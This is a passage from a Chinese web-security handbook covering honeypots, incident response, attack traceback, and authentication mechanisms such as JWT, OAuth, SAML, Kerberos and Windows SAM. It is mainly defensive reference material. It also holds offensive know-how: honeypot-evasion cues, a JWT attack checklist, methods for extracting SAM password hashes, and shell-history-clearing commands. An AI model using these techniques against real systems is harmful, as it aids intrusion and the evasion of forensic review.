反制文件，指在蜜罐环境中设置特定的文件，例如伪装的VPN客户端、特定插件来诱导攻击者点击。

DoS反制，在获取到攻击者的C2样本后，可以通过批量上线的方式影响C2攻击者的控制服务器。

### 8.12.7. 识别技术

攻击者也会尝试对蜜罐进行识别。比较容易的识别的是低交互的蜜罐，尝试一些比较复杂且少见的操作能比较容易的识别低交互的蜜罐。相对困难的是高交互蜜罐的识别，因为高交互蜜罐通常以真实系统为基础来构建，和真实系统比较近似。对这种情况，通常会基于虚拟文件系统和注册表的信息、内存分配特征、硬件特征、特殊指令等来识别。

#### 8.12.7.1. 协议实现识别

部分蜜罐在实现的过程中，协议的部分参数固定或随机的范围有限，可以通过特定参数的范围来识别蜜罐。

部分蜜罐协议支持的版本范围为某一特定版本范围，可以通过对应的版本范围来推测是否为蜜罐。

部分蜜罐在交互过程中有探测客户端特征的交互，可以通过这些交互过程来识别蜜罐。

部分蜜罐对不正确的请求也返回正常的相应，可以通过这种特征来判定蜜罐。

#### 8.12.7.2. 环境特征

部分蜜罐的用户名、密码固定，或内存使用、进程占用等动态特征变化较为规律，可以通过这种方式来判断是否为蜜罐。

### 8.12.8. 参考链接

* [honeypot wiki](https://en.wikipedia.org/wiki/Honeypot%5f%28computing%29)
* [Modern Honey Network](http://threatstream.github.io/mhn/)
* [默安科技：幻阵](https://www.moresec.cn/magic-shield.html)
* [蜜罐与内网安全从0到1](https://xz.aliyun.com/t/998)
* [浅析开源蜜罐识别与全网测绘](https://mp.weixin.qq.com/s?%5F%5Fbiz=Mzk0NzE4MDE2NA==&mid=2247483908&idx=1&sn=e6a319e22c3cd54650bdbba511e58a43)

---

## [RASP](https://websec.readthedocs.io/zh/latest/defense/rasp.html)

### 8.13.1. 简介

RASP（Runtime Application Self-Protection）由Gartner在2014年引入，是一种应用层的安全保护技术。

### 8.13.2. 参考链接

#### 8.13.2.1. 厂商

- [OpenRASP](https://rasp.baidu.com/)
- [Micro Focus](https://www.microfocus.com/en-us/products/application-defender/features)
- [Prevoty](https://www.prevoty.com/)
- [waratek](https://www.waratek.com/application-security-platform/)
- [OWASP AppSensor](http://appsensor.org/)
- [Shadowd](https://shadowd.zecure.org/overview/introduction/)
- [immun](https://www.immun.io/features)
- [Contrast Security](https://www.contrastsecurity.com/runtime-application-self-protection-rasp)
- [Signal Sciences](https://www.signalsciences.com/rasp-runtime-application-self-protection/)
- [BrixBits](http://www.brixbits.com/security-analyzer.html)

#### 8.13.2.2. Blog

- [Python RASP 工程化 一次入侵的思考](https://mp.weixin.qq.com/s/icWaHsC6dzlclxfLhvQjYA)
- [浅谈RASP技术攻防之基础篇](https://www.freebuf.com/articles/web/197823.html)

---

## [应急响应](https://websec.readthedocs.io/zh/latest/defense/emergency.html)

### 8.14.1. 响应流程

#### 8.14.1.1. 事件发生

运维监控人员、客服审核人员等发现问题，向上通报。

#### 8.14.1.2. 事件确认

收集事件信息、分析网络活动相关程序，日志和数据，判断事件的严重性，评估出问题的严重等级，是否向上进行汇报等。

#### 8.14.1.3. 事件响应

各部门通力合作，处理安全问题，具体解决问题，避免存在漏洞未修补、后门未清除等残留问题。

#### 8.14.1.4. 事件关闭

处理完事件之后，需要关闭事件，并写出安全应急处理分析报告，完成整个应急过程。

### 8.14.2. 事件分类

- 病毒、木马、蠕虫事件
- Web服务器入侵事件
- 第三方服务入侵事件
- 系统入侵事件
  - 利用Windows漏洞攻击操作系统
- 网络攻击事件
  - DDoS / ARP欺骗 / DNS劫持等

### 8.14.3. 分析方向

#### 8.14.3.1. 文件分析

- 基于变化的分析
  - 日期
  - 文件增改
  - 最近使用文件
- 源码分析
  - 检查源码改动
  - 查杀WebShell等后门
- 系统日志分析
- 应用日志分析
  - 分析User-Agent，e.g. `awvs / burpsuite / w3af / nessus / openvas`
  - 对每种攻击进行关键字匹配，e.g. `select/alert/eval`
  - 异常请求，连续的404或者500
- `md5sum` 检查常用命令二进制文件的哈希，检查是否被植入rootkit

#### 8.14.3.2. 进程分析

- 符合以下特征的进程
  - CPU或内存资源占用长时间过高
  - 没有签名验证信息
  - 没有描述信息的进程
  - 进程的路径不合法
- dump系统内存进行分析
- 正在运行的进程
- 正在运行的服务
- 父进程和子进程
- 后台可执行文件的完整哈希
- 已安装的应用程序
- 运行着密钥或其他正在自动运行的持久化程序
- 计划任务

#### 8.14.3.3. 身份信息分析

- 本地以及域账号用户
- 异常的身份验证
- 非标准格式的用户名

#### 8.14.3.4. 日志分析

- 杀软检测记录

#### 8.14.3.5. 网络分析

- 防火墙配置
- DNS配置
- 路由配置
- 监听端口和相关服务
- 最近建立的网络连接
- RDP / VPN / SSH 等会话

#### 8.14.3.6. 配置分析

- 查看Linux SE等配置
- 查看环境变量
- 查看配套的注册表信息检索，SAM文件
- 内核模块

### 8.14.4. Linux应急响应

#### 8.14.4.1. 文件分析

- 最近使用文件
  - `find / -ctime -2`
  - `C:\Documents and Settings\Administrator\Recent`
  - `C:\Documents and Settings\Default User\Recent`
  - `%UserProfile%\Recent`
- 系统日志分析
  - /var/log/
- 重点分析位置
  - `/var/log/wtmp` 登录进入，退出，数据交换、关机和重启纪录
  - `/var/run/utmp` 有关当前登录用户的信息记录
  - `/var/log/lastlog` 文件记录用户最后登录的信息，可用 lastlog 命令来查看。
  - `/var/log/secure` 记录登入系统存取数据的文件，例如 pop3/ssh/telnet/ftp 等都会被记录。
  - `/var/log/cron` 与定时任务相关的日志信息
  - `/var/log/message` 系统启动后的信息和错误日志
  - `/var/log/apache2/access.log` apache access log
  - `/etc/passwd` 用户列表
  - `/etc/init.d/` 开机启动项
  - `/etc/cron*` 定时任务
  - `/tmp` 临时目录
  - `~/.ssh`

#### 8.14.4.2. 用户分析

- `/etc/shadow` 密码登陆相关信息
- `uptime` 查看用户登陆时间
- `/etc/sudoers` sudo用户列表

#### 8.14.4.3. 进程分析

- `netstat -ano` 查看是否打开了可疑端口
- `w` 命令，查看用户及其进程
- 分析开机自启程序/脚本
  - `/etc/init.d`
  - `~/.bashrc`
- 查看计划或定时任务
  - `crontab -l`
- `netstat -an` / `lsof` 查看进程端口占用

### 8.14.5. Windows应急响应

#### 8.14.5.1. 文件分析

- 最近使用文件
  - `C:\Documents and Settings\Administrator\Recent`
  - `C:\Documents and Settings\Default User\Recent`
  - `%UserProfile%\Recent`
- 系统日志分析
  - 事件查看器 `eventvwr.msc`

#### 8.14.5.2. 用户分析

- 查看是否有新增用户
- 查看服务器是否有弱口令
- 查看管理员对应键值
- `lusrmgr.msc` 查看账户变化
- `net user` 列出当前登录账户
- `wmic UserAccount get` 列出当前系统所有账户

#### 8.14.5.3. 进程分析

- `netstat -ano` 查看是否打开了可疑端口
- `tasklist` 查看是否有可疑进程
- 分析开机自启程序
  - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`
  - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce`
  - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices`
  - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
  - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run`
  - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
  - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`
  - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices`
  - `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
  - `(ProfilePath)\Start Menu\Programs\Startup` 启动项
  - `msconfig` 启动选项卡
  - `gpedit.msc` 组策略编辑器
- 查看计划或定时任务
  - `C:\Windows\System32\Tasks\`
  - `C:\Windows\SysWOW64\Tasks\`
  - `C:\Windows\tasks\`
  - `schtasks`
  - `taskschd.msc`
  - `compmgmt.msc`
- 查看启动服务
  - `services.msc`

#### 8.14.5.4. 日志分析

- 事件查看
  - `eventvwr.msc`

#### 8.14.5.5. 其他

- 查看系统环境变量

### 8.14.6. 参考链接

- [黑客入侵应急分析手工排查](https://xz.aliyun.com/t/1140)
- [取证入门 web篇](http://www.freebuf.com/column/147929.html)
- [Windows 系统安全事件应急响应](https://xz.aliyun.com/t/2524)
- [企业安全应急响应](https://xz.aliyun.com/t/1632)
- [Technical Approaches to Uncovering and Remediating Malicious Activity](https://us-cert.cisa.gov/ncas/alerts/aa20-245a)

---

## [溯源分析](https://websec.readthedocs.io/zh/latest/defense/forensic.html)

### 8.15.1. 攻击机溯源技术

#### 8.15.1.1. 基于日志的溯源

使用路由器、主机等设备记录网络传输的数据流中的关键信息(时间、源地址、目的地址)，追踪时基于日志查询做反向追踪。

这种方式的优点在于兼容性强、支持事后追溯、网络开销较小。但是同时该方法也受性能、空间和隐私保护等的限制，考虑到以上的因素，可以限制记录的数据特征和数据数量。另外可以使用流量镜像等技术来减小对网络性能的影响。

#### 8.15.1.2. 路由输入调试技术

在攻击持续发送数据，且特性较为稳定的场景下，可以使用路由器的输入调试技术，在匹配到攻击流量时动态的向上追踪。这种方式在DDoS攻击追溯中比较有效，且网络开销较小。

#### 8.15.1.3. 可控洪泛技术

追踪时向潜在的上游路由器进行洪泛攻击，如果发现收到的攻击流量变少则攻击流量会流经相应的路由。这种方式的优点在于不需要预先部署，对协同的需求比较少。但是这种方式本身是一种攻击，会对网络有所影响。

#### 8.15.1.4. 基于包数据修改追溯技术

这种溯源方式直接对数据包进行修改，加入编码或者标记信息，在接收端对传输路径进行重构。这种方式人力投入较少，支持事后分析，但是对某些协议的支持性不太好。

基于这种方式衍生出了随机标记技术，各路由以一定概率对数据包进行标识，接收端收集到多个包后进行重构。

### 8.15.2. 基于蜜罐溯源

- 社交网络jsonp API
- 获取攻击者IP
- 获取burp信息

### 8.15.3. 分析模型

#### 8.15.3.1. 杀伤链(Kill Kain)模型

杀伤链这个概念源自军事领域，它是一个描述攻击环节的模型。一般杀伤链有认为侦查跟踪(Reconnaissance)、武器构建(Weaponization)、载荷投递(Delivery)、漏洞利用(Exploitation)、安装植入(Installation)、通信控制(Command&Control)、达成目标(Actions on Objective)等几个阶段。

在越早的杀伤链环节阻止攻击，防护效果就越好，因此杀伤链的概念也可以用来反制攻击。

在跟踪阶段，攻击者通常会采用扫描和搜索等方式来寻找可能的目标信息并评估攻击成本。在这个阶段可以通过日志分析、邮件分析等方式来发现，这阶段也可以采用威胁情报等方式来获取攻击信息。

武器构建阶段攻击者通常已经准备好了攻击工具，并进行尝试性的攻击，在这个阶段IDS中可能有攻击记录，外网应用、邮箱等帐号可能有密码爆破的记录。有一些攻击者会使用公开攻击工具，会带有一定的已知特征。

载荷投递阶段攻击者通常会采用网络漏洞、鱼叉、水坑、网络劫持、U盘等方式投送恶意代码。此阶段已经有人员在对应的途径收到了攻击载荷，对人员进行充分的安全培训可以做到一定程度的防御。

突防利用阶段攻击者会执行恶意代码来获取系统控制权限，此时木马程序已经执行，此阶段可以依靠杀毒软件、异常行为告警等方式来找到相应的攻击。

安装植入阶段攻击者通常会在web服务器上安装Webshell或植入后门、rootkit等来实现对服务器的持久化控制。可以通过对样本进行逆向工程来找到这些植入。

通信控制阶段攻击者已经实现了远程通信控制，木马会通过Web三方网站、DNS隧道、邮件等方式和控制服务器进行通信。此时可以通过对日志进行分析来找到木马的痕迹。

达成目标阶段时，攻击者开始完成自己的目的，可能是破坏系统正常运行、窃取目标数据、敲诈勒索、横向移动等。此时受控机器中可能已经有攻击者的上传的攻击利用工具，此阶段可以使用蜜罐等方式来发现。

#### 8.15.3.2. 钻石(Diamond)模型

钻石模型由网络情报分析与威胁研究中心(The Center for Cyber Intelligence Anaysis and Threat Research，CCIATR)机构的Sergio Catagirone等人在2013年提出。

该模型把所有的安全事件(Event)分为四个核心元素，即敌手(Adversary)，能力(Capability)，基础设施(Infrastructure)和受害者(Victim)，以菱形连线代表它们之间的关系，因而命名为"钻石模型"。

杀伤链模型的特点是可说明攻击线路和攻击的进程，而钻石模型的特点是可说明攻击者在单个事件中的攻击目的和所使用攻击手法。

在使用钻石模型分析时，通常使用支点分析的方式。支点(Pivoting)指提取一个元素，并利用该元素与数据源相结合以发现相关元素的分析技术。分析中可以随时变换支点，四个核心特征以及两个扩展特征(社会政治、技术)都可能成为当时的分析支点。

### 8.15.4. 关联分析方法

关联分析用于把多个不同的攻击样本结合起来。

#### 8.15.4.1. 文档类

- hash
- ssdeep
- 版本信息(公司/作者/最后修改作者/创建时间/最后修改时间)

#### 8.15.4.2. 行为分析

- 基于网络行为
  - 类似的交互方式

#### 8.15.4.3. 可执行文件相似性分析

- 特殊端口
- 特殊字符串/密钥
- PDB文件路径
  - 相似的文件夹
- 代码复用
  - 相似的代码片段

### 8.15.5. 清除日志方式

- `kill <bash process ID>` 不会存储
- `set +o history` 不写入历史记录
- `unset HISTFILE` 清除历史记录的环境变量

### 8.15.6. 参考链接

- [利用社交账号精准溯源的蜜罐技术](https://mp.weixin.qq.com/s/vlr2X68tMTgDhdDk4aow0g)

---

## [多因子认证](https://websec.readthedocs.io/zh/latest/auth/mfa.html)

多因子认证是在单因子认证不足以保证安全性时使用的方法，通常会引入多种方式对用户身份进行验证。身份验证方法可以基于知识的认证，即密码；也可以基于物品的认证，例如硬件密钥；也可以是基于特征的认证，例如包含指纹在内的生物特征等。

具体来说，目前常用的生物特征有：指纹、人脸、虹膜、静脉、声纹、体态等。常用的评价指标主要是速度（注册、识别使用的时间），精确度（假阳性、假阴性）等。

---

## [SSO](https://websec.readthedocs.io/zh/latest/auth/sso.html)

### 9.2.1. 简介

单点登录(SingleSignOn，SSO)指一个用户可以通过单一的ID和凭证（密码）访问多个相关但彼此独立的系统。

#### 9.2.1.1. 常见流程

1. 用户(User)向服务提供商(Service Provider)发起请求
2. SP重定向User至SSO身份校验服务(Identity Provider)
3. User通过IP登录
4. IP返回凭证给User
5. User将凭证发给SP
6. SP返回受保护的资源给用户

其中凭证要有以下属性

* 签发者的签名
* 凭证的身份
* 使用的时间
   * 过期时间
   * 生效时间

### 9.2.2. 可能的攻击/漏洞

#### 9.2.2.1. 信息泄漏

若SP和IP之前使用明文传输信息，可能会被窃取。

#### 9.2.2.2. 伪造

如果在通信过程中没有对关键信息进行签名，容易被伪造。

---

## [JWT](https://websec.readthedocs.io/zh/latest/auth/jwt.html)

### 9.3.1. 简介

Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC 7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。

### 9.3.2. 构成

分为三个部分，分别为header/payload/signature。其中header是声明的类型和加密使用的算法。payload是载荷，最后是加上 `HMAC(base64(header)+base64(payload), secret)`

### 9.3.3. 安全问题

#### 9.3.3.1. Header部分

- 是否支持修改算法为none/对称加密算法
- 删除签名
- 插入错误信息
- 直接在 header 中加入新的公钥
- kid字段是否有SQL注入/命令注入/目录遍历
- 结合业务功能通过kid直接下载对应公私钥
- 是否强制使用白名单上的加密算法
- JWKS 劫持
- JKU (JWK Set URL) / X5U (X.509 URL) 注入

#### 9.3.3.2. Payload部分

- 其中是否存在敏感信息
- 检查过期策略，比如 `exp` , `iat`

#### 9.3.3.3. Signature部分

- 检查是否强制检查签名
- 密钥是否可以爆破
- 是否可以通过其他方式拿到密钥

#### 9.3.3.4. 其他

- 重放
- 通过匹配校验的时间做时间攻击
- 修改算法RS256为HS256
- 弱密钥破解

### 9.3.4. 参考链接

- [Critical vulnerabilities in JSON Web Token libraries](https://auth0.com/blog/)

---

## [OAuth](https://websec.readthedocs.io/zh/latest/auth/oauth.html)

### 9.4.1. 简介

OAuth是一个关于授权（authorization）的开放网络标准，在全世界得到广泛应用，目前的版本是2.0版。

OAuth在客户端与服务端之间，设置了一个授权层（authorization layer）。客户端不能直接登录服务端，只能登录授权层，以此将用户与客户端区分开来。客户端登录授权层所用的令牌（token），与用户的密码不同。用户可以在登录的时候，指定授权层令牌的权限范围和有效期。

客户端登录授权层以后，服务端根据令牌的权限范围和有效期，向客户端开放用户储存的资料。

OAuth 2.0定义了四种授权方式：授权码模式（authorization code）、简化模式（implicit）、密码模式（resource owner password credentials）和客户端模式（client credentials）。

### 9.4.2. 流程

- 用户打开客户端以后，客户端要求用户给予授权
- 用户同意给予客户端授权
- 客户端使用上一步获得的授权，向认证服务器申请令牌
- 认证服务器对客户端进行认证以后，确认无误，同意发放令牌
- 客户端使用令牌，向资源服务器申请获取资源
- 资源服务器确认令牌无误，同意向客户端开放资源

### 9.4.3. 授权码模式

授权码模式（authorization code）是功能最完整、流程最严密的授权模式。它的特点就是通过客户端的后台服务器，与服务端的认证服务器进行互动。

其流程为：

- 用户访问客户端，后者将前者导向认证服务器
- 用户选择是否给予客户端授权
- 假设用户给予授权，认证服务器将用户导向客户端事先指定的"重定向URI"（redirection URI） ，同时附上一个授权码
- 客户端收到授权码，附上早先的"重定向URI"，向认证服务器申请令牌
- 认证服务器核对了授权码和重定向URI，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token）

A步骤中，客户端申请认证的URI，包含以下参数：

- response_type：表示授权类型，必选项，此处的值固定为 `code`
- client_id：表示客户端的ID，必选项
- redirect_uri：表示重定向URI，可选项
- scope：表示申请的权限范围，可选项
- state：表示客户端的当前状态，需动态指定，防止CSRF

例如：

```
GET /authorize?response_type=code&client_id=s6BhdRkqt3&state=xyz&redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1
Host: server.example.com
```

C步骤中，服务器回应客户端的URI，包含以下参数：

- code：表示授权码，必选项。该码的有效期应该很短且客户端只能使用该码一次，否则会被授权服务器拒绝。该码与客户端ID和重定向URI，是一一对应关系。
- state：如果客户端的请求中包含这个参数，认证服务器回应与请求时相同的参数

例如：

```
HTTP/1.1 302 Found
Location: https://client.example.com/cb?code=SplxlOBeZQQYbYS6WxSbIA&state=xyz
```

D步骤中，客户端向认证服务器申请令牌的HTTP请求，包含以下参数：

- grant_type：表示使用的授权模式，必选项，此处的值固定为 `authorization_code`
- code：表示上一步获得的授权码，必选项
- redirect_uri：表示重定向URI，必选项，且必须与A步骤中的该参数值保持一致
- client_id：表示客户端ID，必选项

例如：

```
POST /token HTTP/1.1
Host: server.example.com
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=SplxlOBeZQQYbYS6WxSbIA&redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb
```

E步骤中，认证服务器发送的HTTP回复，包含以下参数：

- access_token：表示访问令牌，必选项
- token_type：表示令牌类型，该值大小写不敏感，必选项，可以是 `bearer` 类型或 `mac` 类型
- expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间
- refresh_token：表示更新令牌，用来获取下一次的访问令牌，可选项
- scope：表示权限范围，如果与客户端申请的范围一致，此项可省略

例如：

```
HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8
Cache-Control: no-store
Pragma: no-cache

{
  "access_token":"2YotnFZFEjr1zCsicMWpAA",
  "token_type":"example",
  "expires_in":3600,
  "refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA",
  "example_parameter":"example_value"
}
```

### 9.4.4. 简化模式

简化模式（implicit grant type）不通过第三方应用程序的服务器，直接在浏览器中向认证服务器申请令牌，跳过了授权码这个步骤，因此得名。所有步骤在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证。

其步骤为：

- 客户端将用户导向认证服务器
- 用户决定是否给于客户端授权
- 假设用户给予授权，认证服务器将用户导向客户端指定的重定向URI，并在URI的Hash部分包含了访问令牌
- 浏览器向资源服务器发出请求，其中不包括上一步收到的Hash值
- 资源服务器返回一个网页，其中包含的代码可以获取Hash值中的令牌
- 浏览器执行上一步获得的脚本，提取出令牌
- 浏览器将令牌发给客户端

A步骤中，客户端发出的HTTP请求，包含以下参数：

- response_type：表示授权类型，此处的值固定为 `token` ，必选项
- client_id：表示客户端的ID，必选项
- redirect_uri：表示重定向的URI，可选项
- scope：表示权限范围，可选项
- state：表示客户端的当前状态，需动态指定，防止CSRF

例如：

```
GET /authorize?response_type=token&client_id=s6BhdRkqt3&state=xyz&redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1
Host: server.example.com
```

C步骤中，认证服务器回应客户端的URI，包含以下参数：

- access_token：表示访问令牌，必选项
- token_type：表示令牌类型，该值大小写不敏感，必选项
- expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间
- scope：表示权限范围，如果与客户端申请的范围一致，此项可省略
- state：如果客户端的请求中包含这个参数，认证服务器回应与请求时相同的参数

例如：

```
HTTP/1.1 302 Found
Location: http://example.com/cb#access_token=2YotnFZFEjr1zCsicMWpAA&state=xyz&token_type=example&expires_in=3600
```

在上面的例子中，认证服务器用HTTP头信息的Location栏，指定浏览器重定向的网址。注意，在这个网址的Hash部分包含了令牌。

根据上面的D步骤，下一步浏览器会访问Location指定的网址，但是Hash部分不会发送。接下来的E步骤，服务提供商的资源服务器发送过来的代码，会提取出Hash中的令牌。

### 9.4.5. 密码模式

密码模式（Resource Owner Password Credentials Grant）中，用户向客户端提供自己的用户名和密码。客户端使用这些信息，向"服务商提供商"索要授权。

在这种模式中，用户必须把自己的密码给客户端，但是客户端不得储存密码。

其步骤如下：

- 用户向客户端提供用户名和密码
- 客户端将用户名和密码发给认证服务器，向后者请求令牌
- 认证服务器确认无误后，向客户端提供访问令牌

B步骤中，客户端发出的HTTP请求，包含以下参数：

- grant_type：表示授权类型，此处的值固定为 `password` ，必选项
- username：表示用户名，必选项
- password：表示用户的密码，必选项
- scope：表示权限范围，可选项

例如：

```
POST /token HTTP/1.1
Host: server.example.com
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW
Content-Type: application/x-www-form-urlencoded

grant_type=password&username=johndoe&password=A3ddj3w
```

C步骤中，认证服务器向客户端发送访问令牌，例如：

```
HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8
Cache-Control: no-store
Pragma: no-cache

{
    "access_token": "2YotnFZFEjr1zCsicMWpAA",
    "token_type": "example",
    "expires_in": 3600,
    "refresh_token": "tGzv3JOkF0XG5Qx2TlKWIA",
    "example_parameter": "example_value"
}
```

### 9.4.6. 客户端模式

客户端模式（Client Credentials Grant）指客户端以自己的名义，而不是以用户的名义，向服务端进行认证。

其步骤如下：

- 客户端向认证服务器进行身份认证，并要求一个访问令牌
- 认证服务器确认无误后，向客户端提供访问令牌

A步骤中，客户端发出的HTTP请求，包含以下参数：

- granttype：表示授权类型，此处的值固定为 `clientcredentials` ，必选项
- scope：表示权限范围，可选项

例如：

```
POST /token HTTP/1.1
Host: server.example.com
Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW
Content-Type: application/x-www-form-urlencoded

grant_type=client_credentials
```

B步骤中，认证服务器向客户端发送访问令牌，例如：

```
HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8
Cache-Control: no-store
Pragma: no-cache

{
    "access_token": "2YotnFZFEjr1zCsicMWpAA",
    "token_type": "example",
    "expires_in": 3600,
    "example_parameter": "example_value"
}
```

### 9.4.7. 参考链接

- [rfc6749](http://www.rfcreader.com/#rfc6749)
- [理解OAuth](http://www.ruanyifeng.com/blog/2014/05/oauth%5F2%5F0.html)
- [OAuth 2.0 Vulnerabilities](https://ldapwiki.com/wiki/OAuth%202.0%20Vulnerabilities)
- [OAuth Community Site](https://oauth.net/)
- [Hidden OAuth attack vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)

---

## [SAML](https://websec.readthedocs.io/zh/latest/auth/saml.html)

### 9.5.1. 简介

SAML (Security Assertion Markup Language) 译为安全断言标记语言，是一种xXML格式的语言，使用XML格式交互，来完成SSO的功能。

SAML存在1.1和2.0两个版本，这两个版本不兼容，不过在逻辑概念或者对象结构上大致相当，只是在一些细节上有所差异。

### 9.5.2. 认证过程

SAML的认证涉及到三个角色，分别为服务提供者(SP)、认证服务(IDP)、用户(Client)。一个比较典型认证过程如下：

1. Client访问受保护的资源
2. SP生成认证请求SAML返回给Client
3. Client提交请求到IDP
4. IDP返回认证请求
5. Client登陆IDP
6. 认证成功后，IDP生成私钥签名标识了权限的SAML，返回给Client
7. Client提交SAML给SP
8. SP读取SAML，确定请求合法，返回资源

### 9.5.3. 安全问题

* 源于ssl模式下的认证可选性，可以删除签名方式标签绕过认证
* 如果SAML中缺少了expiration，并且断言ID不是唯一的，那么就可能被重放攻击影响

### 9.5.4. 参考链接

* [SAML Wiki](https://en.wikipedia.org/wiki/SAML%5F2.0)
* [RFC7522](https://tools.ietf.org/html/rfc7522)
* [SSO Wars The Token Menace](https://i.blackhat.com/USA-19/Wednesday/us-19-Munoz-SSO-Wars-The-Token-Menace.pdf)

---

## [SCRAM](https://websec.readthedocs.io/zh/latest/auth/scram.html)

### 9.6.1. 简介

SCRAM (Salted Challenge Response Authentication Mechanism) 是一套包含服务器和客户端双向确认的用户认证机制。

### 9.6.2. 参考链接

#### 9.6.2.1. 规范

- [RFC 4422 Simple Authentication and Security Layer (SASL)](https://tools.ietf.org/html/rfc4422)
- [RFC 5802 Salted Challenge Response Authentication Mechanism (SCRAM) SASL and GSS-API Mechanisms](https://tools.ietf.org/html/rfc5802)
- [RFC 7677 SCRAM-SHA-256 and SCRAM-SHA-256-PLUS Simple Authentication and Security Layer (SASL) Mechanisms](https://tools.ietf.org/html/rfc7677)

---

## [Windows本地认证](https://websec.readthedocs.io/zh/latest/auth/windows.html)

### 9.7.1. 本地用户认证

Windows 在进行本地登录认证时操作系统会使用用户输入的密码作为凭证去与系统中的密码进行对比验证。通过 `winlogon.exe` 接收用户输入传递至 `lsass.exe` 进行认证。

`winlogon.exe` 用于在用户注销、重启、锁屏后显示登录界面。 `lsass.exe` 用于将明文密码变成NTLM Hash的形式与SAM数据库比较认证。

### 9.7.2. SAM

安全帐户管理器(Security Accounts Manager，SAM) 是Windows操作系统管理用户帐户的安全所使用的一种机制。用来存储Windows操作系统密码的数据库文件为了避免明文密码泄漏SAM文件中保存的是明文密码在经过一系列算法处理过的 Hash值被保存的Hash分为LM Hash、NTLM Hash。当用户进行身份认证时会将输入的Hash值与SAM文件中保存的Hash值进行对比。

SAM文件保存于 `%SystemRoot%\system32\config\sam` 中，在注册表中保存在 `HKEY_LOCAL_MACHINE\SAM\SAM` ， `HKEY_LOCAL_MACHINE\SECURITY\SAM` 。 在正常情况下 SAM 文件处于锁定状态不可直接访问、复制、移动仅有 system 用户权限才可以读写该文件。

### 9.7.3. 密码破解

- 通过物理接触主机、启动其他操作系统来获取 Windows 分区上的 `%SystemRoot%\system32\config\sam` 文件
- 获取 `%SystemRoot%\repair\sam._` 文件。
- 使用工具从注册表中导出SAM散列值
- 从网络中嗅探分析SMB报文，从中获取密码散列

### 9.7.4. SPNEGO

SPNEGO (SPNEGO: Simple and Protected GSS-API Negotiation)是微软提供的一种使用GSS-API认证机制的安全协议，用于使Webserver共享Windows Credentials，它扩展了Kerberos。

---

## [Kerberos](https://websec.readthedocs.io/zh/latest/auth/kerberos.html)

### 9.8.1. 简介

Kerberos协议起源于美国麻省理工学院Athena项目，基于公私钥加密体制，为分布式环境提供双向验证，在RFC 1510中被采纳，Kerberos是Windows域环境中的默认身份验证协议。

简单地说，Kerberos提供了一种单点登录 (Single Sign-On, SSO)的方法。考虑这样一个场景，在一个网络中有不同的服务器，比如，打印服务器、邮件服务器和文件服务器。这些服务器都有认证的需求。很自然的，不可能让每个服务器自己实现一套认证系统，而是提供一个中心认证服务器(Authentication Server, AS)供这些服务器使用。这样任何客户端就只需维护一个密码就能登录所有服务器。

Kerberos协议是一个基于票据(Ticket)的系统，在Kerberos系统中至少有三个角色：认证服务器(AS)，客户端(Client)和普通服务器(Server)。

认证服务器对用户进行验证，并发行供用户用来请求会话票据的TGT(票据授予票据)。票据授予服务(TGS)在发行给客户的TGT的基础上，为网络服务发行ST(会话票据)。

在Kerberos系统中，客户端和服务器都有一个唯一的名字，叫做Principal。同时，客户端和服务器都有自己的密码，并且它们的密码只有自己和认证服务器AS知道。

### 9.8.2. 基本概念

- **Principal(安全个体)**
  - 被认证的个体，有一个名字(name)和口令(password)

- **KDC (Key Distribution Center)**
  - 提供ticket和临时的会话密钥的网络服务

- **Ticket**
  - 一个记录，用户可以用它来向服务器证明自己的身份，其中包括用户的标识、会话密钥、时间戳，以及其他一些信息。Ticket 中的大多数信息都被加密，密钥为服务器的密钥

- **Authenticator**
  - 一个记录，其中包含一些最近产生的信息，产生这些信息需要用到用户和服务器之间共享的会话密钥

- **Credentials**
  - 一个ticket加上一个秘密的会话密钥

- **Authentication Server (AS)**
  - 通过 long-term key 认证用户
  - AS 给予用户 ticket granting ticket 和 short-term key
  - 认证服务

- **Ticket Granting Server (TGS)**
  - 通过 short-term key 和 Ticket Granting Ticket 认证用户
  - TGS 发放 tickets 给用户以访问其他的服务器
  - 授权和访问控制服务

### 9.8.3. 简化的认证过程

1. 客户端向服务器发起请求，请求内容是：客户端的principal，服务器的principal

2. AS收到请求之后，随机生成一个密码Kc, s(session key), 并生成以下两个票据返回给客户端
   1. 给客户端的票据，用客户端的密码加密，内容为随机密码，session，server_principal
   2. 给服务器端的票据，用服务器的密码加密，内容为随机密码，session，client_principal

